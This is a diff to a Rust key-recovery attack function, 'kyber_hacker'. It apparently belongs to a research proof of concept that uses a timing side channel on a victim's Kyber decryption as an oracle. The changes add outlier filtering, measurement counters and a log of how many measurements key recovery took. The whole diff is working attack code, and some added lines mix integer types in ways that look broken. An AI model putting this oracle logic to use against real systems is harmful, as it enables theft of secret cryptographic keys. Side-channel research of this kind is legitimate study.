@@ -465,6 +465,8 @@ fn kyber_hacker(
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
     let oracle_repetitions: u16 = 32;
     let mut ct_idx: u16 = 0;
+    let mut total_calls: usize = 0;
+    let mut total_skipped_calls: usize = 0;
 
     // Send random mask and masked pointer so that constructed ciphertext is decrypted into
     // message containing victim pointer
@@ -539,21 +541,30 @@ fn kyber_hacker(
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
         }
-        for i in 0..oracle_repetitions as usize {
-            write!(ct_received, "{}, ", times_to_load_test_ptr_atk[i]).unwrap();
-        }
-        write!(ct_received, "\n").unwrap();
-        let mut successes: u16 = 0;
-        for test_time in times_to_load_test_ptr_atk {
+        total_calls += oracle_repetitions;
+        let mut good_measurements: usize = 0;
+        let mut successes: usize = 0;
+        for &test_time in &times_to_load_test_ptr_atk {
+            if test_time == 0 || test_time > 1500 {
+                continue;
+            }
+
+            write!(ct_received, "{}, ", test_time).unwrap();
+
+            good_measurements += 1;
             // If time is high, we got target_ptr, i.e. inequality is satisfied
             if test_time >= threshold_leak {
                 successes += 1;
             }
         }
-        let majority_vote: u8 = (successes * 2 > oracle_repetitions) as u8;
+        write!(ct_received, "\n").unwrap();
+        total_skipped_calls += oracle_repetitions - good_measurements;
+        // TODO: majority is not guaranteed since we may have even number of measurements
+        let majority_vote: u8 = (successes * 2 > good_measurements) as u8;
         msg_data[0] = majority_vote;
         oracle_stream.write_all(&msg_data);
     }
+    println!("Key recovery took {} measurements, filtered out {} of them; total used = {}", total_calls, total_skipped_calls, total_calls - total_skipped_calls);
     threshold_v.clear();
     // disconnect the transaction
     msg_data[0] = (__trash & MSB_MASK) as u8;
